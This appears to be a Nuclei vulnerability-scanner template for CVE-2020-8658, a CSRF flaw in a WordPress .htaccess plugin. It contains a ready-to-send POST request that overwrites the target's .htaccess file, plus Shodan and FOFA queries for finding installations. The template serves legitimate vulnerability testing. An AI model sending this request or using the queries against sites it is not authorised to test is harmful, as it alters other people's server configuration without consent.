id: CVE-2020-8658

info:
  name: CSRF in BestWebSoft Htaccess WordPress Plugin
  author: ProjectDiscoveryAI
  severity: high
  description: The BestWebSoft Htaccess plugin through 1.8.1 for WordPress allows CSRF exploitation due to improper nonce validation, enabling attackers to modify the .htaccess file.
  impact: |
    Allows attackers to perform unauthorized actions on behalf of a user
  remediation: |
    Update BestWebSoft Htaccess WordPress Plugin to the latest version
  reference:
    - https://wordpress.org/plugins/htaccess/#developers
    - https://wpvulndb.com/vulnerabilities/10060
    - https://github.com/V1n1v131r4/Exploiting-WP-Htaccess-by-BestWebSoft-Plugin
    - https://github.com/V1n1v131r4/My-CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2020-8658
    cwe-id: CWE-352
    epss-score: 0.00339
    epss-percentile: 0.72133
    cpe: cpe:2.3:a:bestwebsoft:htaccess:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: bestwebsoft
    product: htaccess
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/htaccess/"
    fofa-query: body=/wp-content/plugins/htaccess/
    publicwww-query: /wp-content/plugins/htaccess/

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=htaccess.php&action=htaccess_editor"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      htccss_customise=%23+BEGIN+WordPress%0D%0A%23+The+directives+%28lines%29+between+%60BEGIN+WordPress%60+and+%60END+WordPress%60+are%0D%0A%23+dynamically+generated%2C+and+should+only+be+modified+via+WordPress+filters.%0D%0A%23+Any+changes+to+the+directives+between+these+markers+will+be+overwritten.%0D%0A%3CIfModule+mod_rewrite.c%3E%0D%0ARewriteEngine+On%0D%0ARewriteBase+%2Fpoc2%2F%0D%0ARewriteRule+%5Eindex%5C.php%24+-+%5BL%5D%0D%0ARewriteCond+%25%7BREQUEST_FILENAME%7D+%21-f%0D%0ARewriteCond+%25%7BREQUEST_FILENAME%7D+%21-d%0D%0ARewriteRule+.+%2Fpoc2%2Findex.php+%5BL%5D%0D%0A%3C%2FIfModule%3E%0D%0A%0D%0A%23+END+WordPress&htccss_form_custom=submit&htccss_submit_button_custom=Save+Changes&htccss_nonce_name=a55b75cec9&_wp_http_referer=%2Fpoc2%2Fwp-admin%2Fadmin.php%3Fpage%3Dhtaccess.php%26action%3Dhtaccess_editor
    matchers:
      - type: word
        words:
          - "Settings saved"
          - "Changes have been saved"
        part: body
